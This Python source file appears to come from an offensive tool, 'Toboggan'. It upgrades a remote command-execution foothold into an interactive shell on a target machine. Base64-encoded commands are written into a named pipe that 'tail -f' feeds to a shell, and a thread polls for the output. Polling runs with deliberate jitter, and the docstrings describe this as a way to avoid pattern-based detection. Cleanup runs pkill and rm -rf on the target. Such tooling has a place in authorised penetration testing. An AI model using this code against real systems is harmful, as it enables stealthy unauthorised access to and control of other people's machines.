# Built-in imports
from typing import TYPE_CHECKING
from abc import ABC, abstractmethod
import base64
import threading
import time

# Local library imports
from toboggan.src import target
from toboggan.src import utils

# Type checking
if TYPE_CHECKING:
    from toboggan.src import target


class Interactivity(ABC):
    """
    Abstract class defining interactivity.
    """

    @abstractmethod
    def execute(self, command: str) -> None:
        pass

    @abstractmethod
    def start(self) -> None:
        pass

    @abstractmethod
    def stop(self, keep_session: bool) -> None:
        """
        Stops the current session.

        Returns:
            None
        """
        pass


class UnixNamedPipe(Interactivity):
    """
    Provides interactivity using named pipes (FIFO) for remote command execution.

    The `UnixNamedPipe` class creates and manages named pipes (FIFO) on the remote system
    to facilitate interactive command execution. It supports introducing a jitter
    in the polling interval to add randomness and avoid pattern-based detections.

    Attributes:
        target (Target): The target on which commands will be executed.
        read_interval (float): The interval at which the named pipe will be read.
        session_identifier (str): An optional identifier for the session.

    Note:
        This class is derived from the `Interactivity` class and overrides its methods
        for specific implementation using named pipes.
    """

    def __init__(
        self,
        target: "target.Target",
        read_interval: float = None,
        session_identifier: str = None,
    ):
        self.__read_interval = read_interval
        self.__read_thread = None
        self.__session = session_identifier

        self.__remote_working_directory = (
            f"{target.remote_working_directory}/{self.__session}"
        )

        self.__target = target

        self.__stdin = f"{self.__remote_working_directory}/i"
        self.__stdout = f"{self.__remote_working_directory}/o"

        # Print request per minute based on read interval
        req_per_minute = 60 / self.__read_interval

        # Calculate 25% of the read interval as jitter
        jitter_range = self.__read_interval * 0.25

        # Calculate the number of requests affected by the jitter
        jitter_effect = abs(60 * jitter_range / self.__read_interval**2)

        # The range of requests per minute due to jitter
        lower_bound = req_per_minute - jitter_effect
        upper_bound = req_per_minute + jitter_effect

        print(
            f"[Toboggan] With a read interval of {self.__read_interval:.2f}s, approximately {req_per_minute:.2f} requests will be made per minute. 📊"
        )
        print(
            f"[Toboggan] Considering the jitter of {jitter_range:.2f}s, this could vary between {lower_bound:.2f} and {upper_bound:.2f} requests per minute. 📊"
        )

    # Public methods

    def start(self) -> None:
        """
        Start the named pipe interactivity.

        This method checks if FIFO pipes are present on the remote system, sets them up if not,
        and then starts the polling thread to continuously read from the named pipe for any
        command output.

        Note:
            The method uses a separate thread to poll the named pipe so as not to block the main thread.
        """
        if not self.__fifo_check():
            self.__fifo_setup()

        self.__start_poll_thread()

    def stop(self, keep_session: bool) -> None:
        """
        Stops the current named pipe interactivity session.

        If the `keep_session` flag is not set, the method will also clean up the session
        by terminating the related processes and removing the stdin and stdout files.

        Args:
            keep_session (bool): If True, keeps the session alive after stopping. Otherwise, cleans it up.

        Returns:
            None
        """
        self.__stop_thread = True  # Set the stop flag
        if self.__read_thread is not None:
            self.__read_thread.join()  # Wait for the thread to finish
        print("[Toboggan] Read thread stopped 📘.")

        if not keep_session:
            print(
                f"[Toboggan] Sending SIGTERM signal to session {self.__session} processes ✋."
            )
            self.__target.executor.execute(
                command="/usr/bin/pkill -TERM -f '/usr/bin/tail -f'",
            )
            print(f"[Toboggan] Removing the stdin and stdout files 🧹.")
            self.__target.executor.execute(
                command=f"/bin/rm -rf {self.__remote_working_directory}",
            )
        else:
            print(
                f"[Toboggan] You can slides again to your shell with {self.__session} 🛝."
            )

    def execute(self, command: str) -> None:
        """
        Writes the input of a command to a named pipe (mkfifo) file after base64 encoding it.

        The command input is first base64-encoded and then written to the stdin named pipe.
        This allows for a more reliable transfer of commands with special characters or multi-line inputs.

        Args:
            command (str): The command to be executed.

        Returns:
            None
        """
        b64command = base64.b64encode(
            "{}\n".format(command.rstrip()).encode("utf-8")
        ).decode("utf-8")
        self.__target.executor.execute(
            command=f"/bin/echo '{b64command}'|/usr/bin/base64 -d > {self.__stdin}"
        )

    # Private methods
    def __fifo_check(self) -> bool:
        """
        Verifies the existence of the named pipes session (stdin and stdout) and checks
        if the associated processes are running.

        This method checks both the presence of the stdin and stdout files and also
        the state of the 'tail -f' process that facilitates reading from the named pipe.

        Returns:
            bool: True if both named pipes exist and the associated process is running. False otherwise.
        """

        # Check if both fifo files exist
        stdin_exists = self.__target.executor.execute(
            command=f"[[ -e {self.__stdin} ]] && /bin/echo 'e'"
        ).strip()
        stdout_exists = self.__target.executor.execute(
            command=f"[[ -e {self.__stdout} ]] && /bin/echo 'e'"
        ).strip()

        if stdin_exists == "e" and stdout_exists == "e":
            print(f"[Toboggan] stdin and stdout files are already present remotely.")

            # Check if the mkfifo process is running
            if self.__target.executor.execute(
                command=f"/bin/ps -ef | /bin/grep 'tail -f {self.__stdin}' | /bin/grep -v /bin/grep"
            ).strip():
                print(f"[Toboggan] mkfifo process is up and running.")
                return True

            print(f"[Toboggan] mkfifo process seems down.")

        return False

    def __fifo_setup(self) -> None:
        """
        Sets up a FIFO for input and output.

        Returns:
            None
        """
        self.__target.executor.execute(
            command=f"mkdir {self.__remote_working_directory}"
        )
        print(
            f"[Toboggan] Working directory created: {self.__remote_working_directory} 📂"
        )

        # Since mkfifo isn't a command you would typically need for booting or system recovery,
        # it's placed in /usr/bin/ in some systems.
        if problem := self.__target.executor.execute(
            command=f"/usr/bin/mkfifo {self.__stdin}"
        ).strip():
            raise RuntimeError(
                f"[Toboggan] Problem occured during mkfifo init: {problem}"
            )

        self.__target.executor.one_shot_execute(
            command=f"/usr/bin/tail -f {self.__stdin}|$0 > {self.__stdout} 2>&1"
        )
        print(
            f"[Toboggan] Initiated FIFO input {self.__stdin!r}; stdout and stderr redirected to {self.__stdout!r}."
        )

    def __start_poll_thread(self) -> None:
        """
        Start a daemonized thread to continually poll the output.

        This method initializes a thread that will keep reading the output from the file
        pointed by `self.__stdout` at regular intervals defined by `self.__read_interval`.

        The thread created by this method is daemonized, which means it will automatically
        terminate once the main program exits.

        Note:
            The thread can be stopped by setting `self.__stop_thread` to `True`.
        """
        self.__stop_thread = False  # Initialize stop flag
        self.__read_thread = threading.Thread(target=self.__poll_output, args=())
        self.__read_thread.daemon = True
        self.__read_thread.start()
        print(f"[Toboggan] Polling thread started 📖")

    def __poll_output(self) -> None:
        """
        Poll the output from a file and display it.

        Continuously read the content of the file pointed by `self.__stdout` and print the result.
        After reading, it clears the content of the file to avoid re-reading the same content again.
        This method sleeps for an interval defined by `self.__read_interval` and an additional
        jitter time returned by `self.__get_jitter()` before reading the file again.

        This method is intended to be used as a target for threading.
        """
        while not self.__stop_thread:  # Check the stop flag
            if result := self.__target.executor.execute(f"cat {self.__stdout}"):
                print(result, end="", flush=True)
                # Clearing the file
                self.__target.executor.execute(command=f"true > {self.__stdout}")

            sleep_time = self.__read_interval + self.__get_jitter()
            time.sleep(sleep_time)

    def __get_jitter(self) -> float:
        """
        Calculate a jitter value to introduce randomness in polling intervals.

        This method calculates a jitter value that is used to add randomness to the polling
        intervals. The jitter value is derived as a percentage of the `self.__read_interval` and
        can vary between -25% to +25% of the `self.__read_interval`.

        Returns:
            float: A jitter value between -25% to +25% of the `self.__read_interval`.

        Note:
            The jitter helps in avoiding pattern-based detections and also reduces the
            risk of overwhelming the target system with fixed-interval requests.
        """
        # Adding a jitter up to 50% of the read_interval using secrets.randbelow
        jitter = utils.random_float_in_range(
            min_value=0, max_value=0.5
        )  # get a random float between 0 and 0.5
        return self.__read_interval * (
            jitter - 0.25
        )  # spread between -25% to +25% of read_interval
